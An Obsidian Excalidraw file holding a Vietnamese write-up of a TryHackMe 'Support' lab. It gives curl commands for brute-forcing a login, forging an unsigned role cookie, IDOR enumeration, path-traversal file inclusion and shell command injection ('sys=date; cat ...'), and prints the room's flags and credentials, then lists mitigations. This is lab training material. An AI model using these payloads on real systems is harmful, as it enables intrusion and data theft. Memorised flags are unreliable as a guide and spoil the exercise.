---

excalidraw-plugin: parsed
tags: [excalidraw]

---
==⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠== You can decompress Drawing data with the command palette: 'Decompress current Excalidraw file'. For more info check in plugin settings under 'Saving'

# Markdown Images

<!-- excalidraw-markdown-image:db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d -->

# Writeup — Support Operations Panel (TryHackMe "Support")

**Mục tiêu:** `http://10.48.187.204/`
**Ngày:** 29/08/2026
**Thư mục:** `/home/ti/SEUCURITY_LABLAB/THM/support_lab/`
**Kết quả cuối:** Lấy được flag admin (`THM{I_AM_ADMIN999}`) và flag user (`THM{GOT_THE_FLAG001}`) — đạt RCE.

---

## Tóm tắt chuỗi khai thác (Attack Chain)

```
Brute-force login ──► Cookie tampering (isITUser=md5("true"))
   ──► IDOR /user/{id} ──► tìm admin email
   ──► Constrained LFI (?skin=) ──► đọc master password
   ──► Login admin ──► Command Injection (sys=) ──► RCE ──► FLAG
```

5 lỗ hổng được xích lại với nhau:
1. **Brute-force** (không rate limiting) → có tài khoản `help@support.thm`
2. **Cookie tampering** (`isITUser` = hash boolean, không ký) → leo quyền IT
3. **IDOR** trên API `/user/{id}` → lộ email admin
4. **Constrained LFI** qua `?skin=` → đọc source `config.php` lộ master password
5. **Command Injection** qua `sys=` → RCE

---

## Bước 0 — Recon trong `/info.php`

`/info.php` là trang `phpinfo()` công khai, lộ cấu hình sẵn dùng cho các bước sau:

```bash
curl -s http://10.48.187.204/info.php
```

Thông tin thu được:
- PHP `8.3.6`, Apache Ubuntu, `DOCUMENT_ROOT=/var/www/html`
- `disable_functions`: **no value** (hàm system không bị chặn)
- `session.save_path=/var/lib/php/sessions`
- Website chạy user `www-data`

---

## Bước 1 — Liệt kê endpoints & thư mục

```bash
# Quét thư mục với gobuster
gobuster dir -u http://10.48.187.204/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt,bak -o gobuster.txt

# Kiểm tra directory listing
curl -s http://10.48.187.204/includes/
curl -s http://10.48.187.204/skins/
```

Kết quả:
```
/index.php        (200)  login
/config.php       (200)  0 bytes  (file cấu hình, không output)
/footer.php       (200)  chứa theme selector ?skin=
/info.php         (200)  phpinfo
/dashboard.php    (302 → index)  auth-gated
/api.php          (302 → index)  auth-gated
/logout.php       (302 → index)
/includes/{header.php, skin.php}
/skins/{default.php, blue.php, green.php, red.php}
```

---

## Bước 2 — Brute-force đăng nhập (không rate limiting)

**Khóa username:** trang login hiển thị placeholder/contact **`help@support.thm`** → đây là tài khoản hợp lệ.

**Khóa khác:** form không giới hạn số lần thử (gửi 50 req/giây vẫn 200), nên brute-force thoải mái.

Dùng script Python dò nhiều luồng, tín hiệu thành công = phản hồi **302 redirect sang `/dashboard.php`** hoặc **Set-Cookie `isITUser=...`**:

```bash
# thử thủ công vài mật khẩu để xác nhận tín hiệu
curl -s -D - -o /dev/null -X POST \
  --data-urlencode "email=help@support.thm" --data-urlencode "password=x" \
  http://10.48.187.204/ | grep -iE 'HTTP/|Location|set-cookie'
```

Tài khoản tìm được:

```
email    : help@support.thm
password : snoopy
```

---

## Bước 3 — Đăng nhập & Cookie Tampering (Broken Access Control)

Đăng nhập lưu cookie:

```bash
curl -s -c cookies.txt -L -X POST \
  --data-urlencode "email=help@support.thm" \
  --data-urlencode "password=snoopy" \
  http://10.48.187.204/
```

Kiểm tra cookie (trong `/tmp/dash.html`, dashboard):

```bash
cat cookies.txt | grep -iE 'phpsessid|isituser'
```

Kết quả — dashboard set cookie **`isITUser`**:
```
isITUser=68934a3e9455fa72420237eb05902327
PHPSESSID=...
```

**Phân tích:** giá trị 32 ký tự hex = **MD5**. Giải mã:

```bash
echo -n "false" | md5sum   # 68934a3e9455fa72420237eb05902327  ✔ khớp!
echo -n "true"  | md5sum   # b326b5062b2f0e69046810717534cb09
```

→ Cookie lưu hash của boolean **role**, **không ký/tamper-proof** → chỉ cần đổi sang `md5("true")`.

**Forge cookie để thành IT User:**

```bash
SID=$(grep -i phpsessid cookies.txt | awk '{print $NF}')
CK="PHPSESSID=$SID; isITUser=b326b5062b2f0e69046810717534cb09"

# xác nhận mở khóa IT Admin Panel
curl -s -b "$CK" http://10.48.187.204/dashboard.php | grep -iE 'IT Admin|View API'
```

→ Xuất hiện **"IT Admin Panel"** với nút **View API**.

---

## Bước 4 — IDOR trên API `/user/{id}`

API `api.php` route qua **PATH_INFO** dạng `/user/{id}`. Trước khi đổi cookie (helpdesk) nó **khóa về đúng user của mình (id=3)**; sau khi thành IT User mới liệt kê được người khác.

Enumerate user ID:

```bash
for id in $(seq 1 10); do
  echo "--- /user/$id ---"
  curl -s -b "$CK" "http://10.48.187.204/user/$id"; echo
done
```

Kết quả (đã xác minh):

```
/user/1 → { "email": "specialadmin@support.thm", "2FA": false, "admin": true  }
/user/2 → { "email": "IT@support.thm",           "2FA": false, "admin": false }
/user/3 → { "email": "help@support.thm",         "2FA": false, "admin": false }
/user/4 → null
```

> ⚠️ Phải gọi **`/user/{id}`** (path), KHÔNG phải `/api.php/user/{id}` (cái này hiển thị HTML tĩnh và bỏ qua tham số).

**Kết quả:** tìm được admin **`specialadmin@support.thm`** (admin: true).

---

## Bước 5 — Constrained LFI qua `?skin=` để đọc source

Dashboard có theme selector `?skin=default|red|green|blue`. Nó `include()` file `skins/{value}.php` không whitelist → **LFI bị giới hạn (.php)**, nhưng vẫn đọc được các file `.php` của server, **in raw source** (kể cả `<?php`).

Đọc `config.php` (chứa master password):

```bash
curl -s -b "$CK" \
  "http://10.48.187.204/dashboard.php?skin=../../../../../var/www/html/config" \
  | grep -iE 'password|MASTER|SITE'
```

Kết quả lộ source:

```php
<?php
$MASTER_PASSWORD = 'support@110';
$SITE_VER  = '1.0';
$SITE_NAME = 'support_portal';
```

**Master password = `support@110`.**

---

## Bước 6 — Login admin

Ghép email admin + password từ config. **Mẹo:** server **loại bỏ ký tự `@`** khi so sánh → password thực tế dùng là `support110` (bỏ `@`):

```bash
# dùng mật khẩu có @ (bị lỗi - ở lại login)
curl -s -L -X POST \
  --data-urlencode "email=specialadmin@support.thm" \
  --data-urlencode "password=support@110" http://10.48.187.204/ | grep -iE 'Welcome'

# ✔ đúng: bỏ @
curl -s -c admin.cookie -L -X POST \
  --data-urlencode "email=specialadmin@support.thm" \
  --data-urlencode "password=support110" http://10.48.187.204/ \
  | grep -iE 'THM|Administrator'
```

Kết quả — **FLAG 1 (admin)**:

```
🎯 Administrator Access Confirmed
THM{I_AM_ADMIN999}
```

---

## Bước 7 — Command Injection (`sys=`) → RCE

Admin dashboard có widget chọn "Date"/"Time" gửi POST tham số **`sys`** vào `shell_exec()`. Source lộ ra điều kiện: **`$sys` phải bắt đầu bằng `date`** → ta chèn sau dấu `;`.

Xác nhận RCE (chạy `id`):

```bash
curl -s -b admin.cookie -X POST \
  --data-urlencode "sys=date; id" \
  http://10.48.187.204/dashboard.php | grep -iE 'uid='
```

Kết quả:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Đọc flag user:**

```bash
curl -s -b admin.cookie -X POST \
  --data-urlencode "sys=date; cat /home/ubuntu/user.txt" \
  http://10.48.187.204/dashboard.php | grep -iE 'THM'
```

**FLAG 2 (user): `THM{GOT_THE_FLAG001}`**

*(Không có `root.txt` — user `www-data` không đủ quyền truy cập `/root`; flag user là mục tiêu cuối của room.)*

---

## Kết quả cuối

| Hạng mục | Giá trị |
|:---|:---|
| Tài khoản helpdesk | `help@support.thm` / `snoopy` |
| Cookie IT (forged) | `isITUser=b326b5062b2f0e69046810717534cb09` (= md5 "true") |
| Admin email | `specialadmin@support.thm` |
| Master password | `support@110` → dùng `support110` |
| **Flag admin** | **`THM{I_AM_ADMIN999}`** |
| **Flag user** | **`THM{GOT_THE_FLAG001}`** |

---

## Tổng hợp lỗ hổng (Mitigation tương ứng)

| # | Lỗ hổng | Bản chất | Khắc phục |
|:--|:---|:---|:---|
| 1 | No rate limiting | Brute-force được | Rate limit / account lockout / CAPTCHA |
| 2 | Cookie tamper | `isITUser` = unsigned MD5 của boolean | Dùng session server-side, sign cookie, không dùng client để quyết định quyền |
| 3 | IDOR (BOLA) | `/user/{id}` không kiểm tra quyền sở hữu | Kiểm tra authorization trước khi trả object |
| 4 | Constrained LFI | `?skin=` include không whitelist | Whitelist nghiêm ngặt giá trị skin |
| 5 | Command Injection | `sys=` nối thẳng vào `shell_exec` | Không truyền input người dùng vào shell; dùng whitelist lệnh |
| 6 | Config lộ qua LFI | `config.php` chứa password cleartext | Không nhúng secret trong source; cấu hình ngoài docroot |

<!-- /excalidraw-markdown-image:db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d -->

# Excalidraw Data

## Text Elements
đại khái là mình hiểu hoàn toàn những gì ở đây ^CrH3STxP

## Embedded Files
db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d: markdown-image

%%
## Drawing
```compressed-json
N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebR4ANm0AFho6IIR9BA4oZm4AbXAwUDBSiBJuCABVAEFNAA4ACQB2KABZNNLIWERKwn1opH4yzG4E5u0ABnr6hIBWAGY5hOTk

xYBGPiLIGG515oXtfYBOY+bm5PWE054trogKEnVuY8nJ4chJBEJlaW455I8ZIfCDWZTBbjvbYQZhQUhsADWCAAwmx8GxSJUAMRvXGTTplTS4bAI5TwoQcYio9GYiRw6zMOC4QI5AmQABmhHw+AAyrAIRJJMSNIE2TC4YiEAB1J6SPYg2HwpF8mAC9CCDxi8m/DjhPJodYgthM7BqXYGt4g8mU3XMfWoDhCbkKhAIYjcerTC4gxgsdhcND1OY+pis

TgAOU4Yn+t3myWuIKEcGIuCgbr2zRmk2aKx4c0mpxBhGYABEMmn3Wh2QQwiCycI4ABJYj2/IAXRBmmElIAosEsjlWx3oUQOAjuI7nSO2CT02g4UIECD2eQss2J078CChcwACpYKAAGUIY+41fwtehnOC64kxE0zVwCVwCGO7J49WIxGuPAQ9Wwkw8Ngcw8MQyTsskCxEs+zTHJomjEHM7oKu44ioIUXRgIa2xYdsw73Ng8JwBuU4EUIsIGCWqa4N

wJT3AMpAIsQbAUBwjYDMoaF0fczDYF8AwAGqhv68o4ZAvphgGqDBmJMLCKIaEQOi7hsmULLEEwtFiZAjzEM8aCvFCmFlEyX4nsoABCbAyAYexGcZEDspwUAAGK4PoXLmugyKhHgjg0R89xOTk1IYpUFn4MS46BYSGIabSqDcZhGAcLgmjBJWqDnpexllHoNLhZFJIQNpAC+MWQNgdqVKpZT0hwvG+JJWm5ZA2RpRlZ41ku2kcs5bkefgXkQD5vG4

P5tVlMFUChQlEARVFk2QF2pDxS1rUpR1c5Zd1FV5WiYUSAtxW9eVvUQFV9oQCVuWlWJd2YWdyXMZGUCNhwvpQDyAkAOLvVRjFtGwGldReCDbE9ZQnhpowSLg+IKlEUDkZUiCUuZN1gJD3HlJlEAAPqTFAzQwDymCNgAmmcHAANIcCWkzhswxAIscYo9IpK6up4VAgrDqDrJMkHaHMALnOsgILFLxz1CCXmC5MhybDw+xSwWCyJHcZS6fpqCTFMbz

YfcXw/H8aD67iRtlGCar2QIEpIrN2LrAgLsu2KRIkvWFJUgdc31YyzLZFAYrXry/KKRqFSI0q0qyqJPEOwgKpqnJmpWsIOp6gnZTGsSZp2XbEDe02LYFPhU2rggt4OpuRaUlglS4OsWrdsQtr2pOW7QmE22q3MnoSwszQhn6nDcAso+SZGHDRha+YLK8lzHEWpbltt2U9fcXY+32mTB0OibJqmfeZp6OaQZMIEyfco7jmgXcgspSKZZvIJwGwJ65

AUOEYZhdulEmDhCupQ/5dAtobGKEDJjrGAXhd+gQ7QiHCOXBU/QnQnwAAqIOYMg7gC4t5lEVJKAA8nAKA/p7RJQYMyKwmguQFwkHoBqURWSBXFIEdyo40L6zmBDbcoR9yYCPCee+O0wZFGxtCCoEhkSkEaAsHku5MCYPZvARSaZhFin5gsdY9R4jNGWDMfY6wFizBHtCLyCwEhJALM0E4lwPyXFltCHWco0CrDmPEReCQgxXyDMcYeN8ygm1+CHN

AeZ4gghtjwmOkonYSCxNgW4otsAeyit7SkCT0AByZCyEOy4uTh1VJHNE0ce5JxlHpdxvA4nKgjpUKOyFoTakkB3HOkA86mlgIXOs5JS6HyvFXGuj9pEN35qCHgrcfbtIfnXHu3M7LHFFoYvMVtxLCXHgaHgK9oQSX9DPOeqAgybFMWsXZ9xixlmCBWUGOVYq737AfVB0IkwpluQaM+2YVj1HsesdZSkZwvzuYQ7oB5KiAERAQAhXiEFQAiSQABD2

F+AAAHqB9AABuOCSFQJIQggBhvCELitgKKOCoCgCSsl2LAD3eBwZQqBlAYtQIAfbxUAQoAEe7CtJQIR4T0DQthfCpFqBUXoqxTivFhLiWkvJZSh0khaX0sZSytlnLQ7OR5IQIwaEeBF2mgNTy3BgTQk0VAGoRBlBSSUggdkBS9lMAoe4c1PwrUUuIiCZhUQTxMBGfM+4GIfgngILyyFMK4WIuRWizF2LcUEqJZIOVFKZU0rpQyplrKOVcuhLgIQF

KABK4QtVoQIU/b1jRvhhL2PEBIAi9wHmPKeKsu0RyiJIvgSRwwcYyPQOsASjQoA9hLAJcMjQEiEAQAJfQVQSEAC0EgACtlCNDUb0CQXM3TkF5tCfm+Z9a6MzMkeourRY2ONfcLyuqVbaGOCsRWpzjiHqBCCNxYx9amI1kGECQIEgFjPSEitZsBZHF+ZBeoN7D2QUMdEults6koj9tiZJeY5hpM7Bk60vsCp0nIA1PJwdQ5FJTqU9OFTY5VN1gC4h

9SSmNLKc0+4rTZkCyNCaRhAtLTQhLs2QZQVhmZVGZc8ZTcFjTJtNnOZpEiGLINMs/M6xRarCniJA0wSNljw4IctC/y5gPtgssIuVz16v2bdvNue8Bzfwk93e4byT6ZX2DMSCxwgQD3qH+yAd821PyBRvEzJlP6Dh/phMBgCoHAMCiFrC2hZg2O+bF+TCQ8xQJSGsWYeirjJEmIlvhmEQFgEi0kKWUtNgyyPfUTYqnAEpYHgkdLt7svhd/mJTY2gi

s7PODs5Izm9EuOMvrW4XXXhueSM0RIyw8yNeC2JHghx4ynsBL8wWgSoNiWcBbC4pxriPsBHowxk2uiRYWPrA4RWLiAQWJByrYA1tHDWLBDrD7uu/Jy10PLh2kiBI/UGC4KtnsxRuxLOY93RuPd+3t3LEWxKL2izYhIZi9FLGW1dm72ZBtbaPTt57+3QFiTWK1trGPmjZjvWFiHTXjL5hSLD0xOZlm6KS2JfrpwZbnGczerHZOpsU+SNoWCpwgc8E

MYvLLDO+si11UGX5KwfmXex/lsSA9WvM7h8PMDIurv63KzYherwGuc4O2JH9RwpYflFgNn9D6YrrCmJcFYmwlhLASxN/XOPjJG/fabr98Zf1W5txl+3iw5hO5e6UNs8DoRwBwcg1sOEAEQPzOVvMawZtAguL18BBt6hHYLNmV4LOYGHsChbf5gJDL2PmO+unRepjycFisDWpiWdLCvtXmB9ir7WLVoErPi8tZVZgTMXX1xljLd0ZPWPNfjhXEWLo

rr5xHPj//lMXVMCZbWNG2YoWI33NgGL0vDWOmNaJEgh+VvtfrGPfsXzvxlWIFleWF1zY0xvmF4n28I7ZwB4S1WEdrX+wi/h48ToKRRpjYJ6h4JNpgxwZkIUKcBUI4Q0KkB0IMI9JMJwGsJ2rJSKghD6DcKQjxAQwdpFBdp4wsyaDzpSjEACRphQA8AfTEC7g1AUz1D0AUwABSK6nMgQG6lA2i/wtWrWDmGsD64w5wi+ZQF67+IsQeosywUsAIqmD

w8cny16JuJ28mpevi6enwAGfK1iKQA8H4qexO9OihMSkIcG2SEASSKSKG6SXsGGVhuSQcbCV4hGDSEgTSYoVGcc1SHSHCkoRGtGJGDGmcbS4mzG0IXSbGCsfSDY3GLyvG7k1c/GfqUMQmcMqQGcMyERAmUm20iWgIfymwSmWyAsNa9q6mmmewZwOYl6Gsq81yCAHy4i9yy0ZmTygWVmR87yp8C+zm8YKsfeSkra3R04s4xmUBEeAWlm6E5O/8pOr

2kOxkzg1uiQ4w0ww8mWM2l2yWtwue8Y5wBwsuLu8uKxvCzOhiA8h+K2xkhw6xohQYKwawphcukWb6yu9eWW9WoumEXisEVweYZw8weuSx8xGenohsWegsAIvitxmE+iZiFwQeJiHOYJXOmE1u6wzOKJ9if2zWaxIGP6Gs9iEGZibxzW1aNiGsz+2YieV2LW5w0wkE+Y1xSOFJYun2R2ZiasdJFWVuXiMwyJ/yeJ4O6JBu5xUwsOnoQ2uqphVuxw8

QOyFWwJ42IeYAb2q21uMWvii8OmN66s8JXQM2NesOQJOYapHJmEzgPOM+H+gS8wOxQSMUiQ16AI/yviQxauiWVpXQzg+i2JyuD6GOv22hpQR20WIGuJu26pmpKxLWdpmWawlwMC42MUF2SpU+5pIJzu4pru1pVw2gsOduM2geTu6ZSQqWRhI2JhFWvppQqxSQxZjiDuMhiWFZBhZWxhROrxuWgBJkUeiCQW4CredirJ8mtwSeD6ZireM2sOFwuia

u4Gt+y+higIgeKsywgJiQreuiQ81JawgsVxAIu52xOY+wgII2x+swu57ptWYGX+8mQOYZFsw8i8MstWN6Vwd68wu5rwB+B6uptwa5relw2+gE2J9iKS3ob+mWP665Fuzeuqawu5bmIEBwPZUs4wVws5iWR2eYMw2FniQYo5viZw2YmYyyRO6s8mABeZMIwBWCg5aEb8pGpC5ClC60ZQ9AtCaUKBw0zCsI1gmBicnCuB3q+BPAhBpQUilyeMRgcwJ

YAAjjyOCC5MkKQDOrMGwHmvoD9OyAgLBJwZUOujzHwWgDpl4lfP8i5qNkLhchITUTejDkelloBJcBYvcC+gaNqdKXqZturNoVILoUanEACKcKNosB5Teg5ZAOYebJYQhokkhqkvYaSI4UlTkjhoHPkgRtyEEZ4XRt4ZUsoZEaJYER4eqEVdkVnNVAaCxvnKgexkXFxmXGgO2MuHxl5mMjDE3HMKJu3LkWkQINJgLOsWBU8aUVJChZUdPFGGhD2aS

b4gZmvDcr5lMaZo8vvF0bXJJpALZi0Q5m5r3iNt/qWo2rtdZmUM/OtW0RAB/F/DHhiSOYzvWbvv9tboemrFoSNjmbGcsUvnaUTmcFcLBHCcjhcdcUDpsN6bmaHgDRnlyYPIkHTvydNq1htgCLcJ3h+HWacZFmsbiILvGIYXer8V0IKWaTskCJ6PGGifDeCaUNbu+acGYuBsdUaaUBMCsEDrUZ1k9mKQzc9UzUWTYlfiBGzuDVbtbgnsVjsjMLjXD

RqQjaUHEO+nLaVorQyRMDsvznZYsLrkrXGZhHED+m8CrNYjNkLFLdNtbjAkCDFdtqGW9XEFyV1ohZzWAECCkMqXCTAqiYLcrYzWAPcfOZmA/i8WjcZILvEINm5hcKcoFW9bNmLceuVlfHTZ7TsikELN/h+O3uyfjVDqLTYr8v7aKVdhGTenmECGBersnaoUViyf4jcZXXEG8Lbg/g+hLFlg3ZCULArfSemXusWWXSKTGQ3YGZtsGUCGDldt7UDu7

V8aeiLi7SXUTsBVfHyeTUzUkKzhebTeDWvWbRBZbUdpnQydbidkfkPAploWvXNvMMsqljLLsWJBMP9cHabUTaYnhdbfiXcSkFcNhaspLfTUHcLV7bzkVtCZmAXc6ZSSrtnpmHjXmWcZhIcHiEdkHoYigzvddtbkg0yYYtiRsEbSrSHSLG1kHqjfgzaUWbnWPQHZ/ZAzzg8dlqqdlv9hMCVirBLHmHgywxKZhDzifdhWYthQA9afogWNPs/QPK/eS

UXRTlTjYoZHDr9Wqf9oqbzYCTphaaCULcI10EkOsUTlnmdk6Z7asXuhLt+ZlorIbW9RMI/ZZS/RzcjoLCLKlllo5gY+Q8HfojFiDgcHDlrf9vonUUHvsT2ag0Y/mV0IqQ4+5XXVw6th/Rto7SGRPco5ifrI/eoxdv4/9qIwCVnssgFYXWgwTYTebRcPMK5fTh9UA3mFloLI7pabk10P8tA9LB4y6UcO6W4wox429T0zqeU/qYhWGWAJTTYrcAMYf

eA8bd09qVg9Zbg4njFEk77UwxXWM59fOYev/Z7S1s5psZYxdkEmM5rpbNCRnTbcZIWUVvTprfSTc1KaXTno01HZiUk+6YEtplY0Iwk6UIqcWeLdTezjM7qqoYHSs6UPoqPUTuPVI8aYcEiehSTT81JV06UE2WLfsBLTso8ybaYz3kme6amT6Xi7M/jiboTrWfgzHQ7a/QnSrEnbSzzniBOQPJReri6dzRLu7YaSC+g10Ny5bNfL8rDfPUK8yQaVU

6Hv2ZAJHuAUOe1bHmfpsLVvJrMLcIPOfbORhXTYenXmYgtruYBAcGBtOfqSi7uabokLg/MKsrBKeULPnYljToPjeW/ksIljLFcA7g3tmCuYrAcACNMKLA+pcMsL+f6wEm8DYmcpLRUUvo40KdMAjlcA6eG5lgrOY8SZLssqBYrDsjpp3dMOMPGGW5lgowjkYvI7uVcMA8sikjNjMLOTyecqrPw1Pmfp6NYhllc0sEW2fuBZubVj/p6EDmfufdLnq

RLL4nTWfhLkHi8YvBfucDvsXr/fdkeYYrVqrtq0dtcBdjLKcDMLTdq4kNpvqx+DAka2/v8me4El1ra9e0LKe6/Q+WXdMFXi+/JksK5aLKcrFn3rvjXnw/Gxa8YscS+dB2BkiRrKXbg4pi+xrKsPc+W4ej+GfvmD+nGG5r/VcwR6cIDl1qsAXqLGfqzrqlPWe+MF2y+85qNt/jMEiYLIhxBchuVqNvXnonNrOZrFmVLkvDAtMLOWsFfJe4lvBTibO

UDgLh+LJvJ4ejx4kGe3fSQ4BDsca1jRuQltuemxnoBCRws85m+yNp5WZ16wftcBsaIZBxbILpOQWKyaE2VrOb/Vp1lvmAW9pmft8T+ssIsMe7Oy+SqwxfoBgqAcxSCtARxXAVxeJLxfQkQE1RdOgcJapBwjgXgebAQV0A9FjJ2tInjD2PQPjKQPOs4LuBwBZIQPjEIFUFLDOkYMQFfAABrGVrrcFmV8yvo8PDaiyLaGFyzcAr76KHlRWC6bDbHPq

lWRLX1bHnZv3GwhVoBLBAOnoB4dOmdxUwaxJsWOyZXWEpV2FoYOFtxOHZV4auFBTuE0aFUhFEIlV+H1WnfJyVVpzlKhF+DhF1VlW5ysZNWxGcb9IJHtUgKORdVjGCa9VwwJADVMZ5EjXbSY7YfLBTVjDiFqZzWzxoTIeXDYnDGGZrWTF3U7y9idGzHo8QAHV9HHWLNOLnViIM83VU+gr3UzFPXGOhavW0v5Ow6FOaNpOcmw6rD51LbXPC9UNSzA3

l5g1ouq2ZkJZUc92GMQMC9Qf905sPOq+UNQXxiK+ytjPG5Swk1A61YV0xQ86ZPx2OKy/wsUOHNi3HMX0xT/FT4cP+NisE2N3WJ4da5wX4MfYAktllmdPVPo3923qzBT5h9XYf0N3Ivl0xkxR70DwXbzA2/MNvU87q3EM0NkNXZeLxtw5B6LmI5y+x/GS2kwN/1e+46tabHYmyMq+u/B087BPf7nAG0CvF0PHz4R1l9vVeIr6eujbe5I4DMaHybyN

gajO0tzPXAC3z3RbLKJ5vNxM6+gtgCVlHNLOe2HD6t3aC6D/a8ItgA62i97kgRXOe2iOMMosF+0uRNFbjBT43CZ+t+/66I88JwI+rSySZi0O8k5P6umV5wLcVc/La/m7wARQM/2JWQenvxv5eN5yJJLMAEhnKUkgwHlIllCxAH19MSzNGBs5iPSxg0ylJGykHnuawllmbvOIC80uYbdMS0hLPIrB7xvBBGYzJWEVis59N2BxpeIDiX1rC4EBwdUx

EHyuaslcBMzJWMA0maVM6+8TcVkzR5xck6c32THIoNkHN02Sag/fhoKwhr9f+RvUplPhUGKtjBGAiYN8QE4rsgcZNb3kcAdro5Z6OTUgd0xm64gfEo2E5DQJUakM3Mefc8vs1pbYlVGRORYJAK0at8McQbMipHQCaQNoh2gxYLoNDLQCuScglukqxMEE1FS19ECCm1MSK0BmGxKgbfUYHd90hSLaUm/zt7F0hYA8XxvHT+pjN9EeQwwQoPt7eITc

KsFknUID7NYwBGxOIdQIl5/EDEzJZvEYPqG69YWU/Iot+lFZZ8pgIGbvOzROI+DVaaxcARY22JXMZmhWEDFrjAypCxh0dduriDuw5h18PWNwV1hz59DW6LtOIA8UBYTkn+V2Nhm1mGFLBRhnwnOm8HCq6Ifim/ZEuViAFd8bhJtb+ubV84LsWOTzTgdyR4Hb0ERxpOIPH0yyJ8tekHKDqjmnpO1vB6gyLCaRnwFtD0zmZ8iUVoHPZeWMrQ2jiNVp

F9TsROEhrQwGHDwf+tWNRhvxdov9k29iCRi0OMguNWmisDZgyLSHLCHeRWMobqw/SMjjIipfxJiN5J4MXaXidWveQyxD8nmcQbfJ/kWHsivaXiZJrIzNzHE8BTzWxEEgtrN976tLSJFgMFw4DD8MzaIRLQ75ZYimOZPUb00V4nCRBqtPEUWxD5GiaW+wq0aGLW7AsXStiQop4MxxLCD+K3VgeGIQbR0JgLNTMHDlpxkMQxq3NgXmJNo6Nd0BvEEe

6K8Seivk/QqHOQI1poCFRWY60aL2TZBjghGDPEXY3grv5dcIYsxnOTVH4MpYBghYQEmSAiiS6IDYltC3TL6jhWtgzMaYJNIvM+W0uMkooOtHAMo+B3F2rU2tbYs5S6ojBocF6EzjK23Q0Md/0DJz10yWJCrLWIvpjMkgdpFZDDTZGCtWsDtS4Q+nH5RCK+p2OxKDWXHTYvENJLXELGHGr1QJCvYeBBO/5aEXSMEwcfBMcaITXs0XNVkgg1ZzEFib

+HPHDlnEotCKeiedsB0FwnYri/yf/C+1czxg42vNQAXRxzyCxk85bADi5xrxS4AkBwB9MBRlhn5rBsnczr4nzCBJB2yyfYELEip4VTEZ+XxLVl+wVN1YPuF9hbiPS6ls8ZwfiamQODHo9E1tW3uG3kyyN9gQIbEhp0ggTsri2+TLM3ivhzsX2YFFEksDolp51kJIiWMQ2Kz0i4cV8Wzv3iskvEDSj/N4LJOYkED7cZwGWFllir+T9SlHWNjR0slE

cB+YbSCrcFUnlYAQ65H/m5Mtw6SYa4dWUpOQI7xSZsiUz0AmEw5tNRsxNDvAWF8SjlVSO7f2rq27ykUgQv6AfFBThxiTSJMhNcoEivZHpZCo5bDrVhAiQQGmksXdgbGU5jYJYswBQoPFHJXEG8RHVmuMBAhrtEcnoWEVPhfxhT/J5weae5Qljd0z4s5QCLGw/JfpIKo2HzvN2+Qd5N8N6Q7iSKBFgZj8OfHceG0nIaxF4c2MWL9JE7xgYaenDYvU

xE4903MybNCvJKRkEiHGzg9GW/knIoNAhtDXRCJ1TzzALsChHbH9Nc4il22QU8EdDNxlt5Z6KwYhoMXx7/SnpqwF6bcDelGS+GemGbIALpk2IfOksMWmoxJZjYROgbCqdcHgncdu2WeXtgcH7Z+TXOCeHPtTWsT5gYKGbNzvsWWShTrE3nXGdeziFJ9uZH4Dqf6wqyKTdS9iCbv62ppgZrgfyfzjslvIDwXJV7Y9mO3DY8kL4W7RLAHMpk25FY2P

CtmBQGIhzPWHeWYBdjablZ5CoFE3IrHmk005SbM18jK2Oqk8h2LmUGQrVLxDFisHWCdjoM8kgRz4PHQ2cJOxp6J9iEsOivExi5xcEAYBQiSxT8z2xY4MBTimgGoQ8UkCfFTLgJRy6PdRKBXCSkV1xYyUiCpQEgpUF3A8ASEDBeoDyEbBGBkQbwJSuGDmAzolKFkRsNgHoB9d0AplTdOZVQC28pguJMOVmX+STcZMQYaBt8WELLJQuS3T7gLCVHyF

1ir7SodCFCSAZQ6YtcOs8TL7QZwQJ3cqmdywzoAbCyGVDNCE9jpVbu53ZwrlUKT5VfuXhODORhqSUYk4BVKqm90gCMYIiAKaIuDw4z3BWqPGSuMkV9R7VygGRdALgGaCo8hqzC3uPZknKPpHOuPNAGFIYCbINM81bgKzmtpvAgqFPZordR5409iA5mZ5AjzKBM97MZ8JzDTQgzs9uqt8HzNz3fh89hyB/JAUAi5ZK5TgZrBjsw2SwoTZgMYqEW9U

RIMtuyZNBkkcDfEMCPxUQ02maX0ZQD0aMnM8Q0wvEdjTBEsUMSqP/lbNh+YdJ4p4l7LxjIlpQv+RUNiWAMR+YCxJegPwnMV+egvDNslMIo0lBcsnWCEsFHKuVAkWNVYDZKByZyDYawQojZzPizsb0o5b8irEMks5ISFjJufvxbkgE25CXSAndR8K9yUu/chAoPOQIjzKgglDAnl2wJcIp5esYrrPJkrlc5KCyyQD2GOBGAKAJCGABTB7AUAoAAke

gBZGRAwB9AbBGBKfLh7cwL5Q3NANSQMIelLy+mWjpYim6r5IyIfb1npOGLeUr5RfZnEBNSHbgtuqAeMPS1ebtizCx3Cwt9ysIILUq13VBT7Du4MgHuIlDkM91Ti4Lvu+C/wj4WIV/d6MakMIkxkoVg95YNCsoHQsSIMK1wqRZhdDEbhwx6gnC4Hgzx4V7ARsWQnZN+1mrKYBYaI7iqIuqIGhp2d7I2Y0SMyJdkFHRbavT2GqM9j4h1TRb3m1kkUW

0F1TngYuVX3AHqO1ELO8UWKUjGciYisdY1fFrJvFJA61eiMfpp4TmyOFgYYllE4N5Rlo12k3XXHI5rREuJMX8ML5Ul5mAShISsUVLIV9g2S1IRPyOCfFL4K9GYX6RaxmiriuAjcQVnhWoCysvzTNXvVzqj9wF9ON6l+OVzltSS/TLUhMFcpwSHGkgmeS6swgfYGW2Qv/vGUVL8jsSgo9fs7VpZJAJm/lINf9ivT213aM9PQcmq5LcCdRQ9VbLC0f

